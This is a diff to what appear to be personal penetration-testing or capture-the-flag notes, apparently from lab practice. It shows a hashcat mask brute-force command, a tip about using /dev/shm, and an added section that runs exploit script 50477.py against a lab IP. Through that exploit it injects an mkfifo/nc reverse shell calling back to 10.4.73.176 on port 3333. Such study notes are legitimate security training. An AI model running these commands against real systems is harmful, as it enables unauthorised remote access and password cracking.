@@ -306,7 +306,11 @@ hashcat -a 3 -m 1400 su.txt --increment susan_nasus_?d?d?d?d?d?d?d?d?d?d
 
 --increment means it brutforces incrementally.
 ________________________________________________________________________________________________________________________________________________________________________________________________________________
-
 if you create some python file under /tmp, it needs to install some python library
 But if you create python file under /dev/shm, you don't need any necessary library file.
+_________________________________________________________________________________________________________________________________________________________________________________________________
+If you are using python file to get RCE to website, you can also inject reverse shell through RCE
+--------------------------------------------------------------------------------------------------
+#python3 50477.py -u http://10.10.90.170/
+Enter Command $rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.73.176 3333 >/tmp/f
 
